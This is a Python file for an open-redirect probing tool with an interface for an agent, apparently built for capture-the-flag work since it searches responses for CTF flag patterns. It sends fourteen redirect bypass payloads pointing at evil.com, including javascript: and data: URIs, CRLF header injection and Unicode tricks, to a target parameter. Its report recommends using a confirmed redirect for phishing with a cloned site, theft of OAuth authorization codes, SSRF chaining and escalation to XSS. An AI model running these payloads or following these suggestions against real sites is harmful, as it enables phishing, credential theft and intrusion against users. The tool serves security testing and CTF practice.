"""Open-redirect probe (split from misc_probe_tools.py)."""

import json
import re
from typing import List, Optional, Tuple

import requests


class OpenRedirectProbeTool:
    """
    OpenRedirectProbeTool: test for open redirect vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/redirect",
          "param": "url",
          "method": "GET",
          "data": {},
          "timeout": 10
        }

    Tests for open redirect vulnerabilities using various bypass techniques
    including protocol-relative URLs, credential section abuse, JavaScript
    scheme, Unicode tricks, and CRLF header injection.
    """

    name: str = "open_redirect_probe"
    description: str = (
        "Test for open redirect vulnerabilities. Input must be JSON with 'url' "
        "(target URL) and 'param' (parameter that controls redirection). Optionally "
        "provide 'method' (GET/POST, default GET), 'data' (extra form data), and "
        "'timeout' (default 10). Tests 14 redirect bypass payloads including "
        "protocol-relative URLs, backslash tricks, credential abuse, JavaScript/data "
        "URIs, Unicode dots, and CRLF injection. Returns structured report with "
        "vulnerable payloads and exploitation suggestions."
    )

    # Redirect payloads: (payload, description)
    PAYLOADS: List[Tuple[str, str]] = [
        ("https://evil.com", "Basic external redirect"),
        ("//evil.com", "Protocol-relative URL"),
        ("/\\evil.com", "Backslash trick"),
        ("https://evil.com%2F%2F", "URL-encoded slashes"),
        ("https://target.com@evil.com", "Credential section abuse"),
        ("https://target.com.evil.com", "Subdomain confusion"),
        ("javascript:alert(1)", "JavaScript scheme"),
        ("data:text/html,<script>alert(1)</script>", "Data URI"),
        ("https://evil.com#https://target.com", "Fragment override"),
        ("https://evil.com?https://target.com", "Query string appended"),
        ("%0d%0aLocation:https://evil.com", "CRLF header injection"),
        ("https://evil%E3%80%82com", "Unicode fullwidth dot"),
        ("/redirect?url=https://evil.com", "Parameter pollution / double redirect"),
        ("https:evil.com", "Missing slashes"),
    ]

    # Flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[OpenRedirectProbeTool] Error: Invalid JSON input. {exc}"

        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        param = (
            data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
        )
        method = (data.get("method") or "GET").upper()
        form_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        if not url:
            return "[OpenRedirectProbeTool] Error: 'url' is required."
        if not param:
            return "[OpenRedirectProbeTool] Error: 'param' (redirect parameter) is required."
        if method not in ("GET", "POST"):
            return f"[OpenRedirectProbeTool] Error: 'method' must be GET or POST, got '{method}'."

        # Get baseline response
        baseline_data = {**form_data, param: "https://example.com"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(
                    url, params=baseline_data, timeout=timeout, allow_redirects=False
                )
            else:
                baseline_resp = self.session.post(
                    url, data=baseline_data, timeout=timeout, allow_redirects=False
                )
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)
            baseline_location = baseline_resp.headers.get("Location", "")
        except Exception as exc:
            return f"[OpenRedirectProbeTool] Error getting baseline response: {exc}"

        # Test each payload
        vulnerable_payloads = []
        flags_found = []

        for payload, description in self.PAYLOADS:
            test_data = {**form_data, param: payload}

            try:
                if method == "GET":
                    resp = self.session.get(
                        url, params=test_data, timeout=timeout, allow_redirects=False
                    )
                else:
                    resp = self.session.post(
                        url, data=test_data, timeout=timeout, allow_redirects=False
                    )

                is_vulnerable = False
                evidence = []

                # Check for redirect status with evil.com in Location
                location = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308):
                    if "evil.com" in location.lower() or "evil" in location.lower():
                        is_vulnerable = True
                        evidence.append(f"Redirect to: {location}")
                    elif payload in location:
                        is_vulnerable = True
                        evidence.append(f"Payload reflected in Location: {location}")

                # Check for meta refresh redirect in body
                meta_refresh = re.search(
                    r'<meta[^>]*http-equiv=["\']?refresh["\']?[^>]*content=["\']?[^"\']*url=([^"\'>\s]+)',
                    resp.text,
                    re.IGNORECASE,
                )
                if meta_refresh:
                    redirect_url = meta_refresh.group(1)
                    if (
                        "evil.com" in redirect_url.lower()
                        or "evil" in redirect_url.lower()
                    ):
                        is_vulnerable = True
                        evidence.append(f"Meta refresh redirect to: {redirect_url}")

                # Check for JavaScript redirect in body
                js_redirect = re.search(
                    r'(?:window\.location|location\.href|location\.replace)\s*[=(]\s*["\']([^"\']+)["\']',
                    resp.text,
                    re.IGNORECASE,
                )
                if js_redirect:
                    redirect_url = js_redirect.group(1)
                    if (
                        "evil.com" in redirect_url.lower()
                        or "evil" in redirect_url.lower()
                    ):
                        is_vulnerable = True
                        evidence.append(f"JavaScript redirect to: {redirect_url}")

                # Check for JavaScript scheme execution
                if payload.startswith("javascript:") and resp.status_code in (
                    301,
                    302,
                    303,
                    307,
                    308,
                ):
                    if "javascript:" in location.lower():
                        is_vulnerable = True
                        evidence.append(f"JavaScript URI in redirect: {location}")

                # Check for flags
                flag = self._extract_flag(resp.text)
                if flag:
                    flags_found.append(flag)
                    evidence.append(f"FLAG FOUND: {flag}")

                if is_vulnerable:
                    vulnerable_payloads.append(
                        {
                            "description": description,
                            "payload": payload,
                            "status": resp.status_code,
                            "location": location,
                            "evidence": evidence,
                        }
                    )

            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

        # Build output report
        output_lines = [
            "[OpenRedirectProbeTool] Open Redirect Probe Results",
            "=" * 55,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Payloads Tested: {len(self.PAYLOADS)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Location: {baseline_location or '(none)'}",
            "",
        ]

        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        if vulnerable_payloads:
            output_lines.append(
                f"VULNERABLE PAYLOADS ({len(vulnerable_payloads)} found):"
            )
            output_lines.append("-" * 40)
            for item in vulnerable_payloads:
                output_lines.append(f"  [{item['description']}]")
                output_lines.append(f"    Payload: {item['payload']}")
                output_lines.append(f"    Status: {item['status']}")
                if item["location"]:
                    output_lines.append(f"    Location: {item['location']}")
                for ev in item["evidence"]:
                    output_lines.append(f"    -> {ev}")
                output_lines.append("")
        else:
            output_lines.append("No open redirect vulnerabilities detected.")
            output_lines.append("")

        # Exploitation suggestions
        output_lines.append("RECOMMENDATIONS:")
        if vulnerable_payloads:
            output_lines.append("  [!] Open redirect confirmed!")
            output_lines.append(
                "  - Use for phishing: redirect users to a clone of the target site"
            )
            output_lines.append(
                "  - Chain with OAuth flows to steal authorization codes"
            )
            output_lines.append(
                "  - Chain with SSRF if the redirect URL is fetched server-side"
            )
            output_lines.append(
                "  - Use to bypass URL allowlists/filters in other parameters"
            )
            output_lines.append(
                "  - Try escalating to XSS via javascript: or data: URIs"
            )
        else:
            output_lines.append(
                "  - No open redirects detected with standard payloads."
            )
            output_lines.append("  - Try double URL encoding: %2568ttps://evil.com")
            output_lines.append(
                "  - Try using the target's own domain as a redirect chain."
            )
            output_lines.append(
                "  - Check for redirect endpoints in JavaScript source code."
            )
            output_lines.append(
                "  - Try different parameter names (next, return, redirect, goto, dest)."
            )

        return "\n".join(output_lines)
